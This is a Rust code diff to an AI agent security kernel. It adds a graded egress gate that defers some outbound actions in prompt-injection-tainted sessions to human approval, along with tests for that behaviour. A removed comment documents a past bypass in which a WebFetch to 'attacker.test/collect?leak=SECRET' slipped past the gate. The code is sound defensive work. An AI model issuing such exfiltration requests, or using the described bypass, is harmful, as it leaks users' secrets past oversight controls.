@@ -92,64 +92,105 @@ pub fn sink_max_conf_for(op: Operation) -> ConfLevel {
     }
 }
 
+/// Three-way outcome of the egress gate.
+///
+/// `ifc_egress_denial` returns `Option<String>` and so can only say deny-or-not.
+/// Grading needs a third answer, because the whole point is that a refusal at a
+/// cheap sink should become a question for a human rather than a dead end.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum EgressVerdict {
+    /// The gate has nothing to say; fall through to the normal decision path.
+    Pass,
+    /// Refuse.
+    Deny(String),
+    /// Defer to a human. Only ever produced when grading is enabled.
+    RequireApproval(String),
+}
+
+/// The egress gate, with the taint response optionally graded by sink
+/// consequence (Option C).
+///
+/// `graded = false` reproduces the historical behaviour EXACTLY: any integrity
+/// taint denies every outbound action. That is the default, so enabling the
+/// grading is a config change and disabling it is a config rollback — the one
+/// change here that can let through something previously refused stays a flag
+/// flip, not a redeploy.
+///
+/// `graded = true` keeps the DETECTION identical (the session ceiling still
+/// decides whether taint is present — no lineage, no trusting the agent's
+/// account of its own data flow) and grades only the RESPONSE, via
+/// [`graded_taint_response`]. Measured over the sink-consequence corpus: of the
+/// refusals caused purely by taint, expensive sinks stay denied, pod-local
+/// reversible ones become approvable, and nothing is silently permitted.
+///
+/// The confidentiality check is NOT graded. A session holding secrets must not
+/// emit them regardless of how cheap the sink looks, and unlike integrity there
+/// is no "the session already lost this" argument to make.
+pub fn ifc_egress_verdict(
+    flow: &FlowTracker,
+    op: Operation,
+    kind: NodeKind,
+    graded: bool,
+) -> EgressVerdict {
+    let is_outbound_action = kind == NodeKind::OutboundAction;
+    let carries_data_out =
+        is_outbound_action || crate::capability::default_sink_class(op).is_exfil_vector();
+    if !carries_data_out {
+        return EgressVerdict::Pass;
+    }
+
+    if is_outbound_action && flow.is_tainted() {
+        let detail = format!(
+            "session carries adversarial integrity (untrusted/web content was \
+             observed); outbound operation {op:?} blocked to prevent exfiltration \
+             of, or action on, injected content"
+        );
+        if !graded {
+            return EgressVerdict::Deny(detail);
+        }
+        match graded_taint_response(op) {
+            TaintResponse::Deny => return EgressVerdict::Deny(detail),
+            TaintResponse::RequireApproval => {
+                return EgressVerdict::RequireApproval(format!(
+                    "{detail}; sink is pod-local and reversible, so this is \
+                     deferred for human approval rather than refused"
+                ))
+            }
+            // Fall through to the confidentiality check — an Allow here means
+            // "integrity does not block this", never "nothing else might".
+            TaintResponse::Allow => {}
+        }
+    }
+
+    if flow
+        .session_exfiltration_check(sink_max_conf_for(op))
+        .is_denied()
+    {
+        return EgressVerdict::Deny(format!(
+            "session confidentiality ceiling exceeds what {op:?} may emit; \
+             outbound operation blocked to prevent secret exfiltration"
+        ));
+    }
+    EgressVerdict::Pass
+}
+
 /// Clock-free IFC egress denial check for the live kernel gate (most-paranoid
 /// #1/#4). Returns `Some(detail)` when an outbound operation must be denied:
 /// either the session is integrity-tainted (adversarial content observed) or its
 /// confidentiality ceiling exceeds what the sink may emit (secret exfiltration).
 /// `None` ⇒ the gate falls through to the normal decision path.
 pub fn ifc_egress_denial(flow: &FlowTracker, op: Operation, kind: NodeKind) -> Option<String> {
-    // An operation is an egress point if the kernel classifies its flow node as
-    // an outbound action, OR if its sink class can move data out of the trust
-    // boundary.
-    //
-    // The second clause fixes a real bypass. `node_kind_for` maps `WebFetch` and
-    // `WebSearch` to `NodeKind::WebContent` — correct, they ingest — but the
-    // gate used to return early for any kind that was not `OutboundAction`, so
-    // BOTH checks below were skipped for them. Meanwhile
-    // `default_sink_class(WebFetch)` is `HTTPEgress`, whose `is_exfil_vector()`
-    // is `true`: nucleus called web fetch an exfiltration vector in one file and
-    // exempted it from the exfiltration gate in another.
-    //
-    // Measured before the fix: in a session already tainted by web content,
-    // `WebFetch("https://attacker.test/collect?leak=SECRET")` was ALLOWED under a
-    // permissive lattice, while a local `WriteFiles` was denied — the more direct
-    // exfiltration channel was the one left open. A restrictive lattice happened
-    // to refuse it, but on capability grounds (`WebFetch@LowRisk exceeds Never`),
-    // which is incidental: a pod only becomes tainted by fetching web content, so
-    // the pods at risk are exactly the ones with `WebFetch` enabled and the
-    // capability gate silent.
-    //
-    // A URL carries a query string, so this is a data-carrying channel and
-    // belongs to the same gate as every other one.
-    let is_outbound_action = kind == NodeKind::OutboundAction;
-    let carries_data_out =
-        is_outbound_action || crate::capability::default_sink_class(op).is_exfil_vector();
-    if !carries_data_out {
-        return None;
+    // Delegates rather than duplicating: two copies of an enforcement rule are
+    // two things that can drift, and this one has already drifted once (the
+    // web-egress bypass). `graded = false` is the historical behaviour.
+    match ifc_egress_verdict(flow, op, kind, false) {
+        EgressVerdict::Deny(d) => Some(d),
+        // Unreachable with `graded = false`, but mapped to a denial rather than
+        // to `None` so that a future edit which starts producing it here fails
+        // closed instead of silently permitting.
+        EgressVerdict::RequireApproval(d) => Some(d),
+        EgressVerdict::Pass => None,
     }
-    // INTEGRITY applies only to true outbound ACTIONS. A web fetch is an ingest:
-    // it reads more adversarial content into a session that is already
-    // adversarially tainted, which adds no integrity the session lacks. Denying
-    // it on this axis would end multi-page research after the first page and buy
-    // nothing — the instinct behind `tainted_session_allows_web_fetch` is right
-    // on this axis, even though its stated reason was mechanical.
-    if is_outbound_action && flow.is_tainted() {
-        return Some(format!(
-            "session carries adversarial integrity (untrusted/web content was \
-             observed); outbound operation {op:?} blocked to prevent exfiltration \
-             of, or action on, injected content"
-        ));
-    }
-    if flow
-        .session_exfiltration_check(sink_max_conf_for(op))
-        .is_denied()
-    {
-        return Some(format!(
-            "session confidentiality ceiling exceeds what {op:?} may emit; \
-             outbound operation blocked to prevent secret exfiltration"
-        ));
-    }
-    None
 }
 
 /// Project what the exposure set WOULD be if this operation executes.
@@ -789,6 +830,107 @@ mod web_egress_bypass_tests {
                 sink_max_conf_for(op) < ConfLevel::Secret,
                 "{op:?} capped at {:?}: a Secret cap can never be exceeded",
                 sink_max_conf_for(op)
+            );
+        }
+    }
+}
+
+#[cfg(test)]
+mod graded_gate_tests {
+    use super::*;
+    use portcullis_core::flow::NodeKind;
+    use portcullis_core::ifc_api::FlowTracker;
+
+    fn tainted() -> FlowTracker {
+        let mut f = FlowTracker::new();
+        f.observe(NodeKind::WebContent).expect("observe");
+        f
+    }
+
+    /// **The rollback guarantee.** With grading off, every outcome must be
+    /// byte-identical to the historical gate. If this ever fails, the flag is
+    /// not a safe default and the change is not a config rollback.
+    #[test]
+    fn ungraded_matches_the_historical_gate_on_every_operation() {
+        let flow = tainted();
+        for op in Operation::ALL {
+            for kind in [
+                NodeKind::OutboundAction,
+                NodeKind::WebContent,
+                NodeKind::FileRead,
+            ] {
+                let legacy = ifc_egress_denial(&flow, op, kind);
+                let ungraded = ifc_egress_verdict(&flow, op, kind, false);
+                match (&legacy, &ungraded) {
+                    (Some(a), EgressVerdict::Deny(b)) => assert_eq!(a, b, "{op:?}/{kind:?}"),
+                    (None, EgressVerdict::Pass) => {}
+                    other => panic!("{op:?}/{kind:?} diverged: {other:?}"),
+                }
+            }
+        }
+    }
+
+    /// Grading must never produce an approval for a sink that can move data out
+    /// or leave an artifact someone else can see. This is the property that
+    /// makes the flag safe to turn on at all.
+    #[test]
+    fn grading_never_defers_an_expensive_sink() {
+        let flow = tainted();
+        for op in Operation::ALL {
+            let sink = portcullis_core::default_sink_class(op);
+            if !(sink.is_exfil_vector() || sink.requires_verified_derivation()) {
+                continue;
+            }
+            let v = ifc_egress_verdict(&flow, op, NodeKind::OutboundAction, true);
+            assert!(
+                !matches!(v, EgressVerdict::RequireApproval(_)),
+                "{op:?} -> {sink:?} is externally visible; got {v:?}"
+            );
+        }
+    }
+
+    /// Grading must actually change something, or the flag is decoration.
+    #[test]
+    fn grading_defers_at_least_one_operation_the_old_gate_refused() {
+        let flow = tainted();
+        let deferred: Vec<_> = Operation::ALL
+            .iter()
+            .filter(|op| {
+                ifc_egress_denial(&flow, **op, NodeKind::OutboundAction).is_some()
+                    && matches!(
+                        ifc_egress_verdict(&flow, **op, NodeKind::OutboundAction, true),
+                        EgressVerdict::RequireApproval(_)
+                    )
+            })
+            .collect();
+        assert!(!deferred.is_empty(), "grading changed nothing");
+    }
+
+    /// Confidentiality is NOT graded: a secret-bearing session is refused even
+    /// at a sink the grading would otherwise defer. Without this, enabling the
+    /// flag would open the exfiltration path the previous PR just closed.
+    #[test]
+    fn grading_does_not_relax_the_confidentiality_check() {
+        let mut flow = FlowTracker::new();
+        flow.observe(NodeKind::Secret).expect("observe a secret");
+        for op in [Operation::WebFetch, Operation::WebSearch] {
+            let v = ifc_egress_verdict(&flow, op, NodeKind::WebContent, true);
+            assert!(
+                matches!(v, EgressVerdict::Deny(_)),
+                "{op:?} must stay denied for a secret-bearing session even when graded, got {v:?}"
+            );
+        }
+    }
+
+    /// A clean session is unaffected by the flag in either position.
+    #[test]
+    fn a_clean_session_is_unaffected_by_grading() {
+        let flow = FlowTracker::new();
+        for op in Operation::ALL {
+            assert_eq!(
+                ifc_egress_verdict(&flow, op, NodeKind::OutboundAction, false),
+                ifc_egress_verdict(&flow, op, NodeKind::OutboundAction, true),
+                "{op:?} differs on a clean session"
             );
         }
     }
